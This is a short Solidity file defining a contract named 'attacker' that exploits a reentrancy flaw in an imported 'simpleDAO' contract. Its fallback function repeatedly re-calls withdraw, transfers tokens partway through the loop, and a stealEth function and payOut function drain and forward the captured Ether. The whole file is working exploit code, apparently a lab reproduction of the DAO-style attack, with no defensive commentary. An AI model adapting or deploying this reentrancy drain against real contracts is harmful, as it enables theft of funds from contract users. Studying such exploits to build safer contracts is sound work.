pragma solidity ^0.5.1;
import "./DAO.sol";

contract attacker {
    event DefaultFunc(address caller, uint amount, uint num, uint daoBalance);
    
    address public daoAddress;
    address public transferAddress;
    
    uint[] public arr;
    uint public a = 0;
    
    function () external payable {
        emit DefaultFunc(msg.sender, msg.value,a,simpleDAO(daoAddress).balances(address(this))-1);
        while (a<5) {
            a++;
            arr.push(a);
            if (a==4) {
                simpleDAO(daoAddress).transferTokens(transferAddress, simpleDAO(daoAddress).balances(address(this))-1);
            }
            simpleDAO(daoAddress).withdraw(address(this));
        }
        
    }
    
    function fundMe() public payable {
        
    }
    
    function stealEth() public {
        simpleDAO(daoAddress).withdraw(address(this));
    }
    
    function payOut(address payable _payee) public returns (bool) {
        if (_payee.send(address(this).balance)) {
            return true;
        }
    }
    
    function buyDAOTokens(uint _amount) public payable {
        simpleDAO(daoAddress).buyTokens.value(_amount)();
    }
    
    function resetA() public {
        a = 0;
    }
    
    function setDAOAddress(address _dao) public {
        daoAddress = _dao;
    }
    
    function setTransferAddress(address _transferAddress) public {
        transferAddress = _transferAddress;
    }
}
